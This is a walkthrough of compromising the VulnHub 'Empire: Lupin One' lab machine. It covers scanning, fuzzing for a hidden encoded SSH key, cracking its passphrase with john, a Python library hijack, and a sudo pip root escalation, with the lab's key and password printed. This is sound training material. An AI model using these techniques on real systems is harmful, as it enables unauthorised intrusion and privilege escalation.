[vulnhub - easy] empire: lupin one
----------------------------------

First I scan the Host-Only network to find the ips of the machines in the network:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ fping -aqg 192.168.56.0/24
192.168.56.1
192.168.56.100
192.168.56.120
```

After that I scan for all ports in the provided ip to get more info:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ nmap -p- -T4 -oN nmap_info_allports 192.168.56.120
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 22:35 -03
Nmap scan report for 192.168.56.120
Host is up (0.00014s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.98 seconds
```

And then a detailed scan on the open ports

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ nmap -sC -sV -p 22,80 -oN nmap_info_detailed 192.168.56.120
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 22:36 -03
Nmap scan report for 192.168.56.120
Host is up (0.00024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)
|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)
|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/~myfiles
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.48 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.45 seconds
```

And after all that, I go check out the webpage being served at port 80:

![empire lupin one 1](./images/empire-lupin-one-1.png)

When inspecting the page's source, I find the following commented out:

```html
<!-- Its an easy box, dont give up. -->
```

I run exiftool in the image found but nothing interesting comes out of it. After that, I decide to check on the '/~myfiles' found in the nmap scan and this is what I find:

![empire lupin one 2](./images/empire-lupin-one-2.png)

But it isn't an actual 404 error message, it is a 200 response with this source code:

```html
<!DOCTYPE html>
<html>
<head>
<title>Error 404</title>
</head>
<body>

<h1>Error 404</h1>

</body>
</html>

<!-- Your can do it, keep trying. -->
```

Since there are only two ports open in this machine, I decide to run gobuster to find if there's more info at port 80:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ gobuster dir -u http://192.168.56.120/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php -o gobuster_dir_info
/index.html           (Status: 200) [Size: 333]
/image                (Status: 301) [Size: 316] [--> http://192.168.56.120/image/]
/manual               (Status: 301) [Size: 317] [--> http://192.168.56.120/manual/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.56.120/javascript/]
/robots.txt           (Status: 200) [Size: 34]
/server-status        (Status: 403) [Size: 279]
```

But nothing interesting comes out of it, but then I decide to do a different kind of enumeration. Since the only interesting folder has a '~' before it, I decide to run enumeration again, but this time with wfuzz and including the '~':

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ wfuzz -f wfuzz_dir_info  -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 http://192.168.56.120/~FUZZ               
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.120/~FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                           
=====================================================================

000005155:   301        9 L      28 W       318 Ch      "secret" 
```

So I access http://192.168.56.120/~secret/ and find:

![empire lupin one 3](./images/empire-lupin-one-3.png)

And the source page reads:

```html
<br>Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,</> 
<br>Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.</> 
<br>I'm smart I know that.</>
<br>Any problem let me know</>
<h4>Your best friend icex64</>
```

The word 'hidden' sometimes means filename beginning with a '.', so I create a file for possible file extensions called 'ext.txt' that reads:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ cat ext.txt 
txt
pem
key
```

And ran wfuzz again with two FUZZ arguments and a '.' in front of the first argument:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ wfuzz -f wfuzz_secret_dir_info -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z file,/home/j/Desktop/vulnhub/empire-lupin-one/ext.txt --hc 404,403 http://192.168.56.120/~secret/.FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.120/~secret/.FUZZ.FUZ2Z
Total requests: 661680

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                           
=====================================================================

000221107:   200        1 L      1 W        4689 Ch     "mysecret - txt"                                  
```

So I access http://192.168.56.120/~secret/.mysecret.txt, and It looks like: 

![empire lupin one 4](./images/empire-lupin-one-4.png)

I copy the code and paste it into an [internet encryption detector](https://www.dcode.fr/cipher-identifier) and find out it is base58 encoded, so I type in:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ echo "<STRING>" | base58 -d > secret                                                                                                         
```

When I read the 'secret' file:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ cat secret
-----BEGIN OPENSSH PRIVATE KEY-----
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
iUJ66WmRUN9EoVlkeCzQJwivI=
-----END OPENSSH PRIVATE KEY-----
```

Then I change the file to add a newline in the end, because that's how ssh keys are normally, and then:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ chmod 400 secret
```

When I try to log in to the machine with that key and user 'icex64' as written in the /~secret/, this happens (as it should, like the /~secret/ directory's index's reads):

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ ssh -i secret icex64@192.168.56.120
Enter passphrase for key 'secret': 
```

The password must be cracked, even the wordlist is given in the /~secret/ directory: 'fasttrack'. Firstly I create a hash to be cracked in john:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ ssh2john secret > secret_hash
```

And then crack it:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ john secret_hash  --wordlist=/usr/share/wordlists/fasttrack.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@55w0rd!        (secret)     
1g 0:00:00:01 DONE (2022-11-03 23:12) 0.5747g/s 36.78p/s 36.78c/s 36.78C/s Spring2017..password2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Then I proceed to log into the machine with password 'P@55w0rd!':

```
┌──(j㉿kali)-[~/Desktop/vulnhub/empire-lupin-one]
└─$ ssh -i secret icex64@192.168.56.120                            
Enter passphrase for key 'secret': 
Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
########################################
Welcome to Empire: Lupin One
########################################
Last login: Thu Nov  3 17:41:29 2022 from 192.168.56.1
icex64@LupinOne:~$ 
```

I get the user flag:

```
icex64@LupinOne:~$ cat user.txt 
    ...,    ,...    ..,.   .,,  *&@@@@@@@@@@&/.    ,,,.   .,..    ...,    ...,  
    ,,,.    .,,,    *&@@%%%%%%%%%%%%%%%%%%%%%%%%%%%&@,.   ..,,    ,,,,    ,,,.  
..,.    ,..,  (@&#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&%,.    ..,,    ,...    ..
    .... .@&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@  ....    ....    ,...  
    .,#@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@  .,..    ,.,.    ...,  
.,,,&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@#@.,    .,.,    .,..    .,
...@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&@####@*.    ..,,    ....    ,.
   @%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%#######@% .,.,    .,.,    .,.,  
..,,@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@%#######@@,    ..,.    ,..,    ..
.,,, @@@@@@@@&%%%%%%%%%%%%%&@@@@@@@@@@@@@@@@@@@%%%#####@@,    .,,,    ,,.,    .,
    ..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%###@@ .,..    ...,    ....  
...,  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%#&@.    ...,    ...,    ..
....   #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%@.    ....    ....    ..
    .,.,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&%%%%%%%#@*.,.,    .,.,    ..@@@@
..,.    .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%#@@    ..,.    ,..*@&&@@.
.,,.    ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%@@    .,,.    .@&&&@( ,,
    ,.,.  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&%%%%%%%@@%%&@@@, ,,,@&@@@.,,,  
....    ...#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&%%%%&%,@%%%%%%%#@@@@@%..    ..
...,    ...,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&@,*,,@%%%%%%@@@&@%%@..    ..
    ,,.,    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/,***,*,@%%%@@&@@@%%###@ ,,.,  
    .,. @@&&&@@,,/@@@@@@@@@@@@@@@@@@@@@@@@#,,,,,,,,,*,,@%%%@&&@@%%%%%##&* ,...  
.,,, @@&@@&@&@@%,*,*,*,*,***,*,*,***,*,*,*,*,*,*,**,&@%%&@@@&@%%%%%%%%@/.,    .,
  /@@&&&&&&&&&&@@*,,,,,,,,,,,,,,,,,,,,,,*,,,**,%@&%%%%@&&&@%%%%%%%%%@(    ,..,  
 @&@&@&@&@&@&@&&@@@@@(,*,*,,**,*,*,,,*#&@@&%%%%%%%%&@@@@@%%%%%%%%@&..,    .,.,  
@@@&&&&&&&&&&&&&&&&&@@@&&&@@@@&&@@&&@&&&%&%%%%%%%@&&&@&%%%%%%&@,..    ...,    ..
 @&&&@&@&@&@&@&@&@&@&@&@&@&@&&@@@&&&&&&&%&%%%%&@&&@@%%%#&@%..,    .,.,    .,.,  
  @@@@&&&&&&&&&&&&&&&&&&&&&&@&&&&&&&&&&&%%&%@&@&@&@@%..   ....    ....    ,..,  
.,,, *@@&&&@&@&@&@&@&@&&&&&&&&&&&&&&&&&%&&@@&&@....    ,.,    .,,,    ,,..    .,
    ,,,,    .,%@@@@@@@@@@@@@@@@%,  ...,@@&&@(,,    ,,,.   .,,,    ,,.,    .,,.  
    .,.,    .,,,    .,,.   ..,.    ,*@@&&@ ,,,,    ,.,.   .,.,    .,.,    .,.,  
...,    ....    ....    ,..    ,..@@@&@#,..    ....    ,..    ...,    ....    ..
    ....    ....    ...    ....@.,%&@..    ....    ...    ....    ....    ....  
    ...,    ....    ....   .*/,...&.,,,    ....    ....   .,..    ...,    ...,  
.,.,    .,.,    ,,.,    .,../*,,&,,    ,.,,    ,.,,    ..,    .,.,    .,.,    ,,

3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
```

After that, the first thing I do is run 'sudo -l':

```
icex64@LupinOne:~$ sudo -l
Matching Defaults entries for icex64 on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User icex64 may run the following commands on LupinOne:
    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

When I run this command as user 'arsene': 

```
icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
Its not yet ready to get in action
```

I try to read the .py file:

```
icex64@LupinOne:~$ cat /home/arsene/heist.py 
import webbrowser

print ("Its not yet ready to get in action")

webbrowser.open("https://empirecybersecurity.co.mz")
```

It imports 'webbrowser' and uses function 'open'. I check this file to see if I can do library injection:

```
icex64@LupinOne:~$ ls -la /usr/lib/python3.9/webbrowser.py 
-rwxrwxrwx 1 root root 24115 Nov  3 19:18 /usr/lib/python3.9/webbrowser.py
```

I can edit it, so I run 'nano /usr/lib/python3.9/webbrowser.py', add the following in the first line of the 'open' function:

```
os.system('/bin/bash')
```

And then run the command as 'arsene' again to get an 'arsene' shell:

```
icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
Its not yet ready to get in action
arsene@LupinOne:/home/icex64$ 
```

I run 'sudo -l' as 'arsene' and get the following:

```
arsene@LupinOne:~$ sudo -l
Matching Defaults entries for arsene on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User arsene may run the following commands on LupinOne:
    (root) NOPASSWD: /usr/bin/pip
```

I then check for 'pip' in gtfobins and find the following:

![empire lupin one 5](./images/empire-lupin-one-5.png)

I follow these steps and get root shell

```
arsene@LupinOne:~$ TF=$(mktemp -d)
arsene@LupinOne:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
arsene@LupinOne:~$ sudo pip install $TF
Processing /tmp/tmp.k6lOYVgZu0
# 
```

I cd to '/root/' and get the flag:

```
# cd /root
# ls
root.txt
# cat root.txt
*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,                       .&&&&&&&&&(            /&&&&&&&&&                       
,                    &&&&&&*                          @&&&&&&                   
,                *&&&&&                                   &&&&&&                
,              &&&&&                                         &&&&&.             
,            &&&&                   ./#%@@&#,                   &&&&*           
,          &%&&          &&&&&&&&&&&**,**/&&(&&&&&&&&             &&&&          
,        &@(&        &&&&&&&&&&&&&&&.....,&&*&&&&&&&&&&             &&&&        
,      .& &          &&&&&&&&&&&&&&&      &&.&&&&&&&&&&               &%&       
,     @& &           &&&&&&&&&&&&&&&      && &&&&&&&&&&                @&&&     
,    &%((            &&&&&&&&&&&&&&&      && &&&&&&&&&&                 #&&&    
,   &#/*             &&&&&&&&&&&&&&&      && #&&&&&&&&&(                 (&&&   
,  %@ &              &&&&&&&&&&&&&&&      && ,&&&&&&&&&&                  /*&/  
,  & &               &&&&&&&&&&&&&&&      &&* &&&&&&&&&&                   & &  
, & &                &&&&&&&&&&&&&&&,     &&& &&&&&&&&&&(                   &,@ 
,.& #                #&&&&&&&&&&&&&&(     &&&.&&&&&&&&&&&                   & & 
*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&             &(&
*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&            & &
*& *              &&&&&&&&&&&&&&&&&&&@.                 &&&&&&&&             @ &
*&              &&&&&&&&&&&&&&&&&&@    &&&&&/          &&&&&&                & &
*% .           &&&&&&&&&&&@&&&&&&&   &  &&(  #&&&&   &&&&.                   % &
*& *            &&&&&&&&&&   /*      @%&%&&&&&&&&    &&&&,                   @ &
*& &               &&&&&&&           & &&&&&&&&&&     @&&&                   & &
*& &                    &&&&&        /   /&&&&         &&&                   & @
*/(,                      &&                            &                   / &.
* & &                     &&&       #             &&&&&&      @             & &.
* .% &                    &&&%&     &    @&&&&&&&&&.   %@&&*               ( @, 
/  & %                   .&&&&  &@ @                 &/                    @ &  
*   & @                  &&&&&&    &&.               ,                    & &   
*    & &               &&&&&&&&&& &    &&&(          &                   & &    
,     & %           &&&&&&&&&&&&&&&(       .&&&&&&&  &                  & &     
,      & .. &&&&&&&&&&&&&&&&&&&&&&&&&&&&*          &  &                & &      
,       #& & &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&        &.             %  &       
,         &  , &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.     &&&&          @ &*        
,           & ,, &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.  /&&&&&&&&    & &@          
,             &  & #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&@ &. &&            
,               && /# /&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&# &&&# &# #&               
,                  &&  &( .&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&  &&                  
/                     ,&&(  &&%   *&&&&&&&&&&%   .&&&  /&&,                     
,                           &&&&&/...         .#&&&&#                           

3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
See you on the next heist.
```
